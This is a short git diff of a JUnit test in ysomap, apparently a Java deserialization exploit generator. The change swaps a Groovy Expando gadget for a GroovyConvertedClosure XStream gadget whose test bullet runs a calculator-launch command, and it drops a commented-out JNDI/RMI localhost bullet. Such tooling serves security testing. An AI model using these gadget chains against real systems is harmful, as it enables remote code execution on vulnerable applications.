@@ -1,4 +1,4 @@
-package ysomap.core.payload.xml;
+package ysomap.core.payload.xstream;
 
 import org.junit.Test;
 import ysomap.core.bean.Bullet;
@@ -9,13 +9,12 @@ import ysomap.core.serializer.Serializer;
  * @author wh1t3P1g
  * @since 2020/4/18
  */
-public class GroovyExpandoTest {
+public class GroovyConvertedClosureTest {
 
     @Test
     public void pack() throws Exception {
-        Payload payload = new GroovyExpando();
+        Payload payload = new GroovyConvertedClosure();
         Bullet bullet = payload.getDefaultBullet("open /System/Applications/Calculator.app");
-//        Bullet bullet = new JdbcRowSetImplBullet().set("jndiURL", "rmi://localhost:1099/test");
         payload.setBullet(bullet);
         Serializer serializer = payload.getSerializer();
         String serialized = (String) serializer.serialize(payload.getObject());
